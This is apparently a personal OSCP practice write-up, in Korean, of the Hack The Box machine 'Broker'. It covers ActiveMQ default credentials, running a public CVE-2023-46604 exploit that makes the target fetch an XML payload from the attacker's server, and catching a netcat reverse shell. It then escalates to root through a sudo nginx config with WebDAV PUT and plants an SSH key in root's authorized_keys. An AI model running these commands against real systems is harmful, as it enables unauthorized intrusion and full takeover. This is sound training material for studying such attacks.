---
slug: "broker"
title: "Broker"
date: 2026-07-21
category: "linux"
section: "OSCP"
group: "01_boxes"
tags: []
excerpt: "default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ Pasted image 20260717145514.png ##### Interesting…"
readingTime: 5
---

#### Box: Broker | Linux | Easy
날짜:
소요시간: 2026 07 17

##### Open Ports
22
80
-> nmap 결과에 **basic realm=ActiveMQRealm** 이런게 있고 80 포트에 들어가보니까 
로그인을 하라고 뜸
-> activeMqRealm -> 다른 언어를 이용하는 시스템 간의 통신 할 수 있게 해주는 애

default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ
![](assets/images/posts/Pasted%20image%2020260717145514.png)
##### Interesting Services
80포트
-> nmap 결과에 **basic realm=ActiveMQRealm** 이런게 있고 80 포트에 들어가보니까 
로그인을 하라고 뜸
-> activeMqRealm -> 다른 언어를 이용하는 시스템 간의 통신 할 수 있게 해주는 애

default credential `admin:admin`로 로그인하니까 접속됨 ㅋㅋㅋ
![](assets/images/posts/Pasted%20image%2020260717145514.png)
##### Initial Foothold
벡터:
명령어:
5.15.15 버전인데 여기에 rce 취약점이 있다고 함
[CVE_2023-46604](https://github.com/NKeshawarz/CVE-2023-46604-RCE)
이거 실행 전에 poc.xml에 있는거 수정
![](assets/images/posts/Pasted%20image%2020260717163757.png)
```sh
# kali에서 세개를 각각 터미널에서 띄움
python3 CVE-2023-46604-RCE.py -i 10.129.230.87  -u http://10.10.14.28:8000/poc.xml

nc -lnvp 5555

python3 -m http.server 8000
```
-> 이 스크립트는 ActiveMQ 서버(`10.129.230.87`)한테 OpenWire로 "이 URL에서 스프링 XML을 읽어서 실행해라"라는 명령을 보내는거지 내 스크립트를 직접적으로 읽는게 아님
-> 피해자가 내 서버를 열어서 해당 파일을 가져가서 읽어야 함으로 이런 식으로 동작하게 해야함

-> **user.txt :** f3be45863fb2bdbe08c5c302d1c8d408
##### Privilege Escalation
벡터:
명령어:
```sh
sudo -l
>     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

https://github.com/DylanGrl/nginx_sudo_privesc/blob/main/exploit.sh
-> 이거 따라 하면 되는데 
```sh
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF

sudo nginx -c /tmp/nginx_pwn.conf
```
-> root 권한으로 put도 허용 해놔서 curl 이용해서 파일도 넣을 수 있음

-> 사실상 여기까지 하면 
![](assets/images/posts/Pasted%20image%2020260717172326.png)
-> 1339 포트가 열림 이게 zimbra 포트이고 이제 여기서 1339 포트로 들어가보면
/root/root.txt를 읽을 수 있음

근데 우리는 쉘을 직접 따야 하는 공부니까
```sh
#kali에서 내 pub키 조회
cat ~/.ssh/id_ed25519.pub

#그리고 내 pub키를 /tmp에 저장후 
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat /tmp/id_rsa.pub)"

#다시 kali에서
ssh root@10.129.9.192
cat root.txt
```
-> **root.txt**: be90c3638a3dbb85d7a7af0f5b39cb80

##### Rabbit Hole (막혔던 것)
- 전반적으로 easy했던거 같음
- easy 문제는 이제 좀 쉬워진듯? 뭐 2,3시간안에 푸는건 아니여도 4시간 정도면 술술 푸네
##### 다음 박스에서 써먹을 것
- nginx sudo privesc 정도?
- exploit 내 환경에 맞게 잘 수정해서 쓰는거 정도?
